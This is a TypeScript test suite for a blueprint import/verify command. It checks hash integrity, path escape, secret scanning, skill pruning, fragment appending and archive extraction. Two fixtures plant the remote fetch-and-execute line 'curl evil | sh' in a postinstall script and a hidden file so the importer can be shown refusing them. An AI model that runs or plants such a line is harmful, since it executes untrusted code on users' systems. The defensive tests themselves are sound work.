import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { computeManifestDigest } from "@sail/sdk/blueprint";
import { blueprintImport, blueprintVerify } from "./blueprint.js";

/**
 * Import/verify behaviour, driven through synthetic artifacts built in-process.
 *
 * The cross-repo half — that Shipwright's exporter emits something this accepts — is
 * Shipwright's harness/roundtrip-verify.mjs. These tests cover the consumer-side rules that
 * live only here: the project precondition, the pruning of stock skills, the fragment append,
 * the post-import surface assertion, and the refusals.
 */

const sha = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");

interface BuildOpts {
  files?: Record<string, string>;
  surface?: Record<string, unknown>;
  compatibility?: Record<string, unknown>;
  roles?: Record<string, string>;
  /** Written into payload/ but deliberately left out of contents[]. */
  stowaways?: Record<string, string>;
  mutate?: (m: Record<string, unknown>) => void;
}

/** Build a staged artifact directory whose manifest is correct by construction. */
async function buildArtifact(opts: BuildOpts = {}): Promise<string> {
  const files = opts.files ?? { "AGENTS.md": "# blueprint surface\n", "scripts/gen.mjs": "export default 1\n" };
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bp-art-"));
  for (const [rel, body] of Object.entries({ ...files, ...(opts.stowaways ?? {}) })) {
    const abs = path.join(dir, "payload", rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, body);
  }
  const manifest: Record<string, unknown> = {
    schemaVersion: "shipwright.blueprint.manifest/v1",
    blueprint: { slug: "t-bp", version: "v1", kind: "crystallized" },
    digest: `sha256:${"0".repeat(64)}`,
    contents: Object.entries(files).map(([rel, body]) => ({
      path: rel,
      sha256: sha(body),
      bytes: Buffer.byteLength(body),
      role: opts.roles?.[rel] ?? (rel.startsWith("scripts/") ? "generator" : "agent-surface"),
    })),
    ...(opts.surface ? { surface: opts.surface } : {}),
    ...(opts.compatibility ? { compatibility: opts.compatibility } : {}),
  };
  opts.mutate?.(manifest);
  manifest.digest = await computeManifestDigest(manifest as never);
  fs.writeFileSync(path.join(dir, "blueprint.manifest.json"), JSON.stringify(manifest, null, 2));
  return dir;
}

/** A minimal stand-in for a `sailor init` project: .sail/ plus some stock surface. */
function makeProject(stockSkills: string[] = ["sailor-operate", "sailor-mandates", "sailor-strategy"]): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bp-proj-"));
  fs.mkdirSync(path.join(root, ".sail"), { recursive: true });
  fs.writeFileSync(path.join(root, "AGENTS.md"), "# Stock scaffold guide\n");
  fs.writeFileSync(path.join(root, "package.json"), '{"name":"p"}\n');
  fs.mkdirSync(path.join(root, "src"), { recursive: true });
  fs.writeFileSync(path.join(root, "src", "mandate.ts"), "export const stock = true\n");
  for (const s of stockSkills) {
    fs.mkdirSync(path.join(root, ".agents", "skills", s), { recursive: true });
    fs.writeFileSync(path.join(root, ".agents", "skills", s, "SKILL.md"), `# ${s}\n`);
  }
  return root;
}

/**
 * Capture console output, and contain the command's side effects.
 *
 * `blueprintVerify` signals refusal by setting `process.exitCode = 1` — correct for a CLI,
 * but it would otherwise leak into the test runner's own exit status and fail the whole file
 * even though every assertion passed. Restore it, and return it so a test can assert on it.
 */
async function capture(
  fn: () => Promise<unknown>,
): Promise<{ out: string; err: string; threw: Error | null; exitCode: number | undefined }> {
  const out: string[] = [];
  const err: string[] = [];
  const log = console.log;
  const error = console.error;
  const priorExit = process.exitCode;
  console.log = (...a: unknown[]) => out.push(a.join(" "));
  console.error = (...a: unknown[]) => err.push(a.join(" "));
  let threw: Error | null = null;
  try {
    await fn();
  } catch (e) {
    threw = e as Error;
  } finally {
    console.log = log;
    console.error = error;
  }
  const exitCode = typeof process.exitCode === "number" ? process.exitCode : undefined;
  process.exitCode = priorExit;
  return { out: out.join("\n"), err: err.join("\n"), threw, exitCode };
}

// ── verify ─────────────────────────────────────────────────────────────────────

test("verify accepts a well-formed artifact and says integrity, not authenticity", async () => {
  const art = await buildArtifact();
  const { out } = await capture(() => blueprintVerify(art, {}));
  assert.match(out, /✓ verified/);
  assert.match(out, /INTEGRITY check, not a signature/);
});

test("verify refuses a tampered payload file, and exits non-zero", async () => {
  const art = await buildArtifact();
  fs.appendFileSync(path.join(art, "payload", "AGENTS.md"), "# injected\n");
  const { out, exitCode } = await capture(() => blueprintVerify(art, {}));
  assert.match(out, /✗ refused/);
  assert.match(out, /hash_mismatch/);
  assert.equal(exitCode, 1, "a refusal must be scriptable, not just printed");
});

test("verify refuses an artifact with no manifest", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bp-empty-"));
  fs.mkdirSync(path.join(dir, "payload"));
  const { threw } = await capture(() => blueprintVerify(dir, {}));
  assert.match(threw?.message ?? "", /missing blueprint\.manifest\.json/);
});

test("verify reports findings as JSON when asked", async () => {
  const art = await buildArtifact({ compatibility: { chains: [130] } });
  const { out } = await capture(() => blueprintVerify(art, { chain: "8453", json: true }));
  const parsed = JSON.parse(out) as { status: string; findings: { code: string }[] };
  assert.equal(parsed.status, "refused");
  assert.ok(parsed.findings.some((f) => f.code === "incompatible_chain"));
});

// ── import preconditions ───────────────────────────────────────────────────────

test("import refuses a directory that is not a Sailor project", async () => {
  const art = await buildArtifact();
  const notAProject = fs.mkdtempSync(path.join(os.tmpdir(), "bp-nope-"));
  const { threw } = await capture(() => blueprintImport(art, notAProject, { yes: true }));
  // A blueprint is an overlay; without a scaffold there is nothing to overlay onto.
  assert.match(threw?.message ?? "", /not a Sailor project/);
});

test("import refuses an artifact that fails verification, with no override", async () => {
  const art = await buildArtifact();
  fs.appendFileSync(path.join(art, "payload", "AGENTS.md"), "# injected\n");
  const { threw, err } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
  assert.match(threw?.message ?? "", /failed verification/);
  assert.match(err, /hash_mismatch/);
});

test("import refuses a payload carrying a possible secret", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# s\n", "scripts/gen.mjs": `const K = "0x${"ab".repeat(32)}";\n` },
  });
  const { threw } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
  assert.match(threw?.message ?? "", /possible secrets/);
});

test("import refuses a payload package.json with auto-running scripts", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# s\n", "package.json": '{"scripts":{"postinstall":"curl evil | sh"}}\n' },
    roles: { "package.json": "config" },
  });
  const { threw } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
  assert.match(threw?.message ?? "", /auto-running scripts/);
});

test("import refuses unattended when stdin is not a TTY and --yes is absent", async () => {
  const art = await buildArtifact();
  const { threw } = await capture(() => blueprintImport(art, makeProject(), {}));
  // clone's audit prompt is simply SKIPPED under --yes/--json; import must refuse instead.
  assert.match(threw?.message ?? "", /not a TTY and --yes was not given/);
});

test("import refuses a manifest whose destination escapes the project", async () => {
  const art = await buildArtifact({
    mutate: (m) => {
      (m.contents as { path: string }[])[0].path = "../escaped.md";
    },
  });
  const { threw } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
  // Caught by validateManifest's path rule before any write is planned.
  assert.ok(threw, "expected a refusal");
});

// ── import behaviour ───────────────────────────────────────────────────────────

test("import replaces the stock surface and prunes what the design does not use", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# blueprint surface\n", "scripts/gen.mjs": "export default 1\n" },
    surface: { keepSkills: ["sailor-operate"], pruned: ["src/mandate.ts"] },
  });
  const proj = makeProject();
  const { threw, out } = await capture(() => blueprintImport(art, proj, { yes: true }));
  assert.equal(threw, null, threw?.message);
  assert.match(out, /✓ imported/);

  assert.equal(fs.readFileSync(path.join(proj, "AGENTS.md"), "utf-8"), "# blueprint surface\n");
  assert.ok(!fs.existsSync(path.join(proj, "src", "mandate.ts")), "pruned path must be gone");
  // keepSkills names only sailor-operate, but sailor-mandates is a core skill and is
  // protected from pruning. sailor-strategy is custom and not kept, so it goes.
  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["sailor-mandates", "sailor-operate"]);
});

test("import never deletes a skill the artifact itself ships", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# s\n", ".agents/skills/bp-skill/SKILL.md": "# bp\n" },
    surface: { keepSkills: [] },
  });
  const proj = makeProject(["sailor-mandates"]);
  const { threw } = await capture(() => blueprintImport(art, proj, { yes: true }));
  assert.equal(threw, null, threw?.message);
  // keepSkills is empty, yet the shipped skill survives — otherwise import would delete
  // what it just installed. sailor-mandates is core, so it survives too.
  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["bp-skill", "sailor-mandates"]);
});

test("import never prunes a core skill, even when keepSkills is empty", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# s\n" },
    surface: { keepSkills: [] },
  });
  // sailor-navigator is the operating guide; a blueprint cannot remove it. sailor-strategy
  // is custom, so an empty keepSkills prunes it.
  const proj = makeProject(["sailor-navigator", "sailor-strategy"]);
  const { threw } = await capture(() => blueprintImport(art, proj, { yes: true }));
  assert.equal(threw, null, threw?.message);
  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["sailor-navigator"]);
});

test("import never writes the manifest into the project", async () => {
  const art = await buildArtifact();
  const proj = makeProject();
  await capture(() => blueprintImport(art, proj, { yes: true }));
  // The manifest names the blueprint, version and grade; a project carrying it is no longer
  // a blind subject for a later measurement cycle.
  const walk = (d: string): string[] =>
    fs.readdirSync(d, { withFileTypes: true }).flatMap((e) =>
      e.isDirectory() ? walk(path.join(d, e.name)) : [e.name],
    );
  assert.ok(!walk(proj).includes("blueprint.manifest.json"));
});

test("import writes the .sail/.blueprint marker with the blueprint identity", async () => {
  const art = await buildArtifact();
  const proj = makeProject();
  const { threw } = await capture(() => blueprintImport(art, proj, { yes: true }));
  assert.equal(threw, null, threw?.message);
  const marker = JSON.parse(fs.readFileSync(path.join(proj, ".sail", ".blueprint"), "utf-8"));
  assert.equal(marker.slug, "t-bp");
  assert.equal(marker.version, "v1");
  assert.equal(marker.kind, "crystallized");
  assert.ok(marker.importedAt, "importedAt should be recorded for the future harbor update path");
});

test("import appends a fragment instead of overwriting its target, idempotently", async () => {
  const art = await buildArtifact({
    files: { "AGENTS.md": "# replaced surface\n", "notes.fragment.md": "## build notes\n" },
    surface: { fragment: { path: "notes.fragment.md", target: "GUIDE.md", marker: "build-notes" } },
  });
  const proj = makeProject();
  fs.writeFileSync(path.join(proj, "GUIDE.md"), "# existing guide\n");

  await capture(() => blueprintImport(art, proj, { yes: true }));
  let guide = fs.readFileSync(path.join(proj, "GUIDE.md"), "utf-8");
  assert.match(guide, /# existing guide/, "the target's own content must survive");
  assert.match(guide, /## build notes/);
  // The fragment is applied, not copied — so it must not land as a file of its own.
  assert.ok(!fs.existsSync(path.join(proj, "notes.fragment.md")));

  await capture(() => blueprintImport(art, proj, { yes: true }));
  guide = fs.readFileSync(path.join(proj, "GUIDE.md"), "utf-8");
  assert.equal(guide.match(/build-notes:start/g)?.length, 1, "re-import must replace, not stack, the block");
});

test("--dry-run reports the whole plan and writes nothing", async () => {
  const art = await buildArtifact({ surface: { pruned: ["src/mandate.ts"] } });
  const proj = makeProject();
  const before = fs.readFileSync(path.join(proj, "AGENTS.md"), "utf-8");
  const { out } = await capture(() => blueprintImport(art, proj, { yes: true, dryRun: true }));

  assert.match(out, /nothing written/);
  assert.match(out, /replace agent-surface AGENTS\.md/);
  assert.match(out, /src\/mandate\.ts/);
  assert.equal(fs.readFileSync(path.join(proj, "AGENTS.md"), "utf-8"), before);
  assert.ok(fs.existsSync(path.join(proj, "src", "mandate.ts")));
});

test("import refuses an artifact whose payload hides an undeclared file", async () => {
  const art = await buildArtifact({ stowaways: { "postinstall.sh": "curl evil | sh\n" } });
  const { threw, err } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
  assert.match(threw?.message ?? "", /failed verification/);
  assert.match(err, /unexpected_file/);
});

test("import extracts a .tar.gz through the same hardening clone uses", async () => {
  const art = await buildArtifact();
  const tgz = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "bp-tgz-")), "a.tar.gz");
  execFileSync("tar", ["-czf", tgz, "-C", art, "."]);
  const proj = makeProject();
  const { threw, out } = await capture(() => blueprintImport(tgz, proj, { yes: true }));
  assert.equal(threw, null, threw?.message);
  assert.match(out, /✓ imported/);
  assert.equal(fs.readFileSync(path.join(proj, "AGENTS.md"), "utf-8"), "# blueprint surface\n");
});
